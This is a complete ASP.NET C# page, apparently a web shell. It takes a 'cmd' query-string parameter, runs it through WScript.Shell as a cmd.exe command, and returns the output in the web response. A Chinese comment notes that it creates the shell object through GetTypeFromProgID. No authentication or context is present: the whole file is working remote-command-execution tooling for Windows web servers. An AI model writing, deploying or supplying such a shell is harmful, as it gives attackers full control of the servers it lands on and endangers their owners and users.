<%@ Page Language="C#" %>
<%
string command = Request.QueryString["cmd"];
if (!string.IsNullOrEmpty(command))
{
    try
    {
        // 使用 GetTypeFromProgID 创建 WScript.Shell 对象
        Type shellType = Type.GetTypeFromProgID("WScript.Shell");
        dynamic shell = Activator.CreateInstance(shellType);
        dynamic exec = shell.Exec("cmd.exe /c " + command);
        dynamic stdout = exec.StdOut;
        string output = "";
        while (!stdout.AtEndOfStream)
        {
            output += stdout.ReadLine() + "\n";
        }

        Response.Write(output);
    }
    catch (Exception ex)
    {
        Response.Write($"Error: {Server.HtmlEncode(ex.Message)}");
    }
}
else
{
    Response.Write("No command");
}
%>